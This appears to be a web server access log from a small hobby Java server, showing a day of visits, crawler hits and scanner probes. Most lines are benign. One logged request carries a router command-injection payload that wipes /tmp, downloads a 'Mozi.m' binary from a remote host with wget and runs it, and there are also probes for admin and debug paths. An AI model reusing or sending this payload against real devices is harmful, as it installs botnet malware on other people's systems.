@@ -1,0 +1,268 @@
+[2019-12-05 02:05:06] [71.6.232.9 / Conn #0] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36", "Accept": "*/*", "Accept-Encoding": "gzip"}
+[2019-12-05 02:05:06] [71.6.232.9 / Conn #0] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 02:05:06 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 02:05:06] [SERVER] Cached "/homepage.html" (6240 bytes).
+[2019-12-05 02:05:06] [71.6.232.9 / Conn #0] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 02:05:06] [71.6.232.9 / Conn #0] Connection terminated
+[2019-12-05 03:16:10] [54.172.145.117 / Conn #1] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213", "User-Agent": "Cloud mapping experiment. Contact research@pdrlabs.net", "Accept": "*/*", "Accept-Encoding": "gzip"}
+[2019-12-05 03:16:10] [54.172.145.117 / Conn #1] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 03:16:10 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 03:16:10] [54.172.145.117 / Conn #1] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 03:16:10] [54.172.145.117 / Conn #1] Connection terminated
+[2019-12-05 03:25:34] [54.172.145.117 / Conn #2] [HTTP-REQUEST] {"GET": "/clientaccesspolicy.xml", "Host": "176.23.117.213", "Accept-Encoding": "identity", "Content-Length": "0", "User-Agent": "Cloud mapping experiment. Contact research@pdrlabs.net"}
+[2019-12-05 03:25:34] [54.172.145.117 / Conn #2] [INFO] /clientaccesspolicy.xml doesn't exist, returning 404 page.
+[2019-12-05 03:25:34] [54.172.145.117 / Conn #2] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 03:25:34 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 03:25:34] [SERVER] Cached "404.html" (533 bytes).
+[2019-12-05 03:25:34] [54.172.145.117 / Conn #2] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 03:25:34] [54.172.145.117 / Conn #2] Connection terminated
+[2019-12-05 05:18:27] [185.128.41.50 / Conn #3] [HTTP-REQUEST] {"GET": "/manager/html", "Connection": "close", "User-Agent": "Java/1.8.0_131", "Host": "176.23.117.213", "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2"}
+[2019-12-05 05:18:27] [185.128.41.50 / Conn #3] [INFO] /manager/html.html doesn't exist, returning 404 page.
+[2019-12-05 05:18:27] [185.128.41.50 / Conn #3] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 05:18:27 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 05:18:27] [185.128.41.50 / Conn #3] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 05:18:27] [185.128.41.50 / Conn #3] Connection terminated
+[2019-12-05 05:51:03] [198.143.158.178 / Conn #4] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ", "Accept": "*/*", "Accept-Encoding": "gzip"}
+[2019-12-05 05:51:03] [198.143.158.178 / Conn #4] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 05:51:03 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 05:51:03] [198.143.158.178 / Conn #4] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 05:51:04] [198.143.158.178 / Conn #4] Connection terminated
+[2019-12-05 09:22:08] [185.103.128.243 / Conn #5] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213:80", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36", "Content-Length": "0"}
+[2019-12-05 09:22:08] [185.103.128.243 / Conn #5] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 09:22:08 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 09:22:08] [185.103.128.243 / Conn #5] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 09:22:08] [185.103.128.243 / Conn #5] Connection terminated
+[2019-12-05 09:27:04] [185.153.196.97 / Conn #6] [HTTP-REQUEST] {"GET": "/?XDEBUG_SESSION_START=phpstorm", "Host": "176.23.117.213:80", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Connection": "close", "Accept-Encoding": "gzip"}
+[2019-12-05 09:27:04] [185.153.196.97 / Conn #6] [INFO] /?XDEBUG_SESSION_START=phpstorm.html doesn't exist, returning 404 page.
+[2019-12-05 09:27:04] [185.153.196.97 / Conn #6] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 09:27:04 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 09:27:04] [185.153.196.97 / Conn #6] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 09:27:08] [185.153.196.97 / Conn #6] [ERROR] java.net.SocketTimeoutException: Read timed out
+[2019-12-05 09:27:08] [185.153.196.97 / Conn #6] Connection terminated
+[2019-12-05 12:21:22] [139.255.105.219 / Conn #7] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213:80", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7", "Content-Length": "0"}
+[2019-12-05 12:21:22] [139.255.105.219 / Conn #7] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 12:21:22 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 12:21:22] [139.255.105.219 / Conn #7] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 12:21:23] [139.255.105.219 / Conn #7] Connection terminated
+[2019-12-05 13:43:03] [61.219.11.153 / Conn #8] [ERROR] java.net.SocketTimeoutException: Read timed out
+[2019-12-05 13:43:03] [61.219.11.153 / Conn #8] Connection terminated
+[2019-12-05 13:45:39] [185.211.69.37 / Conn #9] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213:80", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36", "Content-Length": "0"}
+[2019-12-05 13:45:39] [185.211.69.37 / Conn #9] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 13:45:39 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 13:45:39] [185.211.69.37 / Conn #9] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 13:45:39] [185.211.69.37 / Conn #9] Connection terminated
+[2019-12-05 14:51:04] [2.200.104.169 / Conn #10] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213", "Accept": "text/plain,text/html"}
+[2019-12-05 14:51:04] [2.200.104.169 / Conn #10] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 14:51:04 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 14:51:04] [2.200.104.169 / Conn #10] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 14:51:04] [2.200.104.169 / Conn #10] Connection terminated
+[2019-12-05 16:01:36] [66.102.9.168 / Conn #0] [HTTP-REQUEST] {"GET": "/", "Host": "jaibel.ddns.net", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7", "Dnt": "1", "Forwarded": "for=176.23.117.213", "Purpose": "prefetch", "Save-Data": "on", "Scheme": "http", "Upgrade-Insecure-Requests": "1", "Via": "1.1 Chrome-Compression-Proxy", "X-Forwarded-For": "176.23.117.213", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"}
+[2019-12-05 16:01:36] [66.102.9.168 / Conn #0] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 16:01:36 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 16:01:36] [SERVER] Cached "/homepage.html" (6240 bytes).
+[2019-12-05 16:01:36] [66.102.9.168 / Conn #0] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 16:01:36] [66.102.9.168 / Conn #0] Connection terminated
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #1] [HTTP-REQUEST] {"GET": "/darktheme.css", "Host": "jaibel.ddns.net", "Accept": "text/css,*/*;q=0.1", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7", "Dnt": "1", "Forwarded": "for=176.23.117.213", "Purpose": "prefetch", "Referer": "http://jaibel.ddns.net/", "Save-Data": "on", "Scheme": "http", "Via": "1.1 Chrome-Compression-Proxy", "X-Forwarded-For": "176.23.117.213", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"}
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #1] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 16:01:36 CET 2019", "Content-type": "text/css", "Content-length": "1929", "Connection": "close"}
+[2019-12-05 16:01:36] [SERVER] Cached "/darktheme.css" (1929 bytes).
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #1] [HTTP-RESPONSE] [BODY] File{"name": "/darktheme.css", "length": 1929}
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #1] Connection terminated
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #2] [HTTP-REQUEST] {"GET": "/scripts/backgroundChanger.js", "Host": "jaibel.ddns.net", "Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7", "Dnt": "1", "Forwarded": "for=176.23.117.213", "Purpose": "prefetch", "Referer": "http://jaibel.ddns.net/", "Save-Data": "on", "Scheme": "http", "Via": "1.1 Chrome-Compression-Proxy", "X-Forwarded-For": "176.23.117.213", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"}
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #2] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 16:01:36 CET 2019", "Content-type": "text/js", "Content-length": "1304", "Connection": "close"}
+[2019-12-05 16:01:36] [SERVER] Cached "/scripts/backgroundChanger.js" (1304 bytes).
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #2] [HTTP-RESPONSE] [BODY] File{"name": "/scripts/backgroundChanger.js", "length": 1304}
+[2019-12-05 16:01:36] [66.102.9.164 / Conn #2] Connection terminated
+[2019-12-05 16:01:49] [66.102.9.166 / Conn #3] [HTTP-REQUEST] {"GET": "/nanna.mp4", "Host": "jaibel.ddns.net", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7", "Dnt": "1", "Forwarded": "for=176.23.117.213", "Save-Data": "on", "Scheme": "http", "Upgrade-Insecure-Requests": "1", "Via": "1.1 Chrome-Compression-Proxy", "X-Forwarded-For": "176.23.117.213", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36"}
+[2019-12-05 16:01:49] [66.102.9.166 / Conn #3] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 16:01:49 CET 2019", "Content-type": "text/plain", "Content-length": "1118741037", "Connection": "close"}
+[2019-12-05 16:01:49] [176.23.117.213 / Conn #4] [HTTP-REQUEST] {"GET": "/nanna.mp4", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Pragma": "no-cache", "Cache-Control": "no-cache", "DNT": "1", "Save-Data": "on", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Linux; Android 9; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 16:01:49] [176.23.117.213 / Conn #4] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 16:01:49 CET 2019", "Content-type": "text/plain", "Content-length": "1118741037", "Connection": "close"}
+[2019-12-05 16:01:49] [66.102.9.166 / Conn #3] [ERROR] java.net.SocketException: Connection reset by peer (Write failed)
+[2019-12-05 16:01:49] [66.102.9.166 / Conn #3] Connection terminated
+[2019-12-05 16:01:55] [176.23.117.213 / Conn #4] [ERROR] java.net.SocketException: Broken pipe (Write failed)
+[2019-12-05 16:01:55] [176.23.117.213 / Conn #4] Connection terminated
+[2019-12-05 16:49:59] [104.169.69.237 / Conn #5] Connection terminated
+[2019-12-05 16:50:00] [104.169.69.237 / Conn #6] [HTTP-REQUEST] {"GET": "/", "host": "176.23.117.213"}
+[2019-12-05 16:50:00] [104.169.69.237 / Conn #6] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 16:50:00 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 16:50:00] [104.169.69.237 / Conn #6] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 16:50:00] [104.169.69.237 / Conn #6] Connection terminated
+[2019-12-05 17:31:19] [45.143.221.27 / Conn #7] [HTTP-REQUEST] {"GET": "/", "TE": "deflate,gzip;q=0.3", "Connection": "TE, close", "Host": "176.23.117.213:80", "User-Agent": "libwww-perl/6.43"}
+[2019-12-05 17:31:19] [45.143.221.27 / Conn #7] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 17:31:19 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 17:31:19] [45.143.221.27 / Conn #7] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 17:31:20] [45.143.221.27 / Conn #7] Connection terminated
+[2019-12-05 17:32:16] [111.42.66.151 / Conn #8] [HTTP-REQUEST] {"GET": "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://111.42.66.151:38343/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"}
+[2019-12-05 17:32:16] [111.42.66.151 / Conn #8] [INFO] /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://111.42.66.151:38343/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 doesn't exist, returning 404 page.
+[2019-12-05 17:32:16] [111.42.66.151 / Conn #8] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 404 Not Found", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 17:32:16 CET 2019", "Content-type": "text/html", "Content-length": "533", "Connection": "close"}
+[2019-12-05 17:32:16] [SERVER] Cached "404.html" (533 bytes).
+[2019-12-05 17:32:16] [111.42.66.151 / Conn #8] [HTTP-RESPONSE] [BODY] File{"name": "404.html", "length": 533}
+[2019-12-05 17:32:18] [111.42.66.151 / Conn #8] Connection terminated
+[2019-12-05 18:43:54] [54.36.148.76 / Conn #9] [HTTP-REQUEST] {"GET": "/homepage.html", "Host": "jaibel.ddns.net", "User-Agent": "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)", "Accept": "*/*", "Accept-Encoding": "deflate, gzip"}
+[2019-12-05 18:43:54] [54.36.148.76 / Conn #9] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 18:43:54 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 18:43:54] [54.36.148.76 / Conn #9] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 18:43:54] [54.36.148.76 / Conn #9] Connection terminated
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #10] [HTTP-REQUEST] {"GET": "/", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "DNT": "1", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #10] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:39 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #10] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #10] Connection terminated
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #12] [HTTP-REQUEST] {"GET": "/darktheme.css", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "text/css,*/*;q=0.1", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #13] [HTTP-REQUEST] {"GET": "/image/CyberFish.png", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #12] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:39 CET 2019", "Content-type": "text/css", "Content-length": "1929", "Connection": "close"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #11] [HTTP-REQUEST] {"GET": "/scripts/backgroundChanger.js", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "*/*", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #13] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:39 CET 2019", "Content-type": "image/png", "Content-length": "838937", "Connection": "close"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #12] [HTTP-RESPONSE] [BODY] File{"name": "/darktheme.css", "length": 1929}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #14] [HTTP-REQUEST] {"GET": "/image/Jaibel.png", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #11] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:39 CET 2019", "Content-type": "text/js", "Content-length": "1304", "Connection": "close"}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #11] [HTTP-RESPONSE] [BODY] File{"name": "/scripts/backgroundChanger.js", "length": 1304}
+[2019-12-05 19:18:39] [80.62.116.240 / Conn #14] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:39 CET 2019", "Content-type": "image/png", "Content-length": "101307", "Connection": "close"}
+[2019-12-05 19:18:39] [SERVER] Cached "/image/Jaibel.png" (101307 bytes).
+[2019-12-05 19:18:39] [SERVER] Cached "/image/CyberFish.png" (838937 bytes).
+[2019-12-05 19:18:40] [80.62.116.240 / Conn #12] Connection terminated
+[2019-12-05 19:18:40] [80.62.116.240 / Conn #14] [HTTP-RESPONSE] [BODY] File{"name": "/image/Jaibel.png", "length": 101307}
+[2019-12-05 19:18:40] [80.62.116.240 / Conn #11] Connection terminated
+[2019-12-05 19:18:40] [80.62.116.240 / Conn #15] [HTTP-REQUEST] {"GET": "/image/ThingsThatMove.gif", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "image/webp,image/apng,image/*,*/*;q=0.8", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:40] [80.62.116.240 / Conn #15] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:40 CET 2019", "Content-type": "image/gif", "Content-length": "2555480", "Connection": "close"}
+[2019-12-05 19:18:41] [80.62.116.240 / Conn #14] Connection terminated
+[2019-12-05 19:18:43] [80.62.116.240 / Conn #13] [HTTP-RESPONSE] [BODY] File{"name": "/image/CyberFish.png", "length": 838937}
+[2019-12-05 19:18:44] [80.62.116.240 / Conn #13] Connection terminated
+[2019-12-05 19:18:45] [80.62.116.240 / Conn #16] [HTTP-REQUEST] {"GET": "/nanna.mp4", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "DNT": "1", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:18:45] [80.62.116.240 / Conn #16] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:18:45 CET 2019", "Content-type": "text/plain", "Content-length": "1118741037", "Connection": "close"}
+[2019-12-05 19:18:46] [80.62.116.240 / Conn #16] [ERROR] java.net.SocketException: Broken pipe (Write failed)
+[2019-12-05 19:18:46] [80.62.116.240 / Conn #16] Connection terminated
+[2019-12-05 19:18:54] [80.62.116.240 / Conn #15] [HTTP-RESPONSE] [BODY] File{"name": "/image/ThingsThatMove.gif", "length": 2555480}
+[2019-12-05 19:18:55] [80.62.116.240 / Conn #15] Connection terminated
+[2019-12-05 19:41:46] [62.197.216.63 / Conn #17] [HTTP-REQUEST] {"GET": "/", "Host": "176.23.117.213:80", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36", "Content-Length": "0"}
+[2019-12-05 19:41:46] [62.197.216.63 / Conn #17] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:41:46 CET 2019", "Content-type": "text/html", "Content-length": "6240", "Connection": "close"}
+[2019-12-05 19:41:46] [62.197.216.63 / Conn #17] [HTTP-RESPONSE] [BODY] File{"name": "/homepage.html", "length": 6240}
+[2019-12-05 19:41:46] [62.197.216.63 / Conn #17] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #18] [HTTP-REQUEST] {"GET": "/pages/snake/snake.html", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "DNT": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Referer": "http://jaibel.ddns.net/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #18] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/html", "Content-length": "653", "Connection": "close"}
+[2019-12-05 19:45:20] [SERVER] Cached "/pages/snake/snake.html" (653 bytes).
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #18] [HTTP-RESPONSE] [BODY] File{"name": "/pages/snake/snake.html", "length": 653}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #18] Connection terminated
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #19] [HTTP-REQUEST] {"GET": "/darktheme.css", "Host": "jaibel.ddns.net", "Connection": "keep-alive", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36", "DNT": "1", "Accept": "text/css,*/*;q=0.1", "Referer": "http://jaibel.ddns.net/pages/snake/snake.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7"}
+[2019-12-05 19:45:20] [80.62.116.240 / Conn #19] [HTTP-RESPONSE] [HEADER] {"HTTP/1.1 200 OK", "Server": "Java HTTP Server by CyberCat3", "Date": "Thu Dec 05 19:45:20 CET 2019", "Content-type": "text/css", "Content-length": "1929", "Connection": "close"}
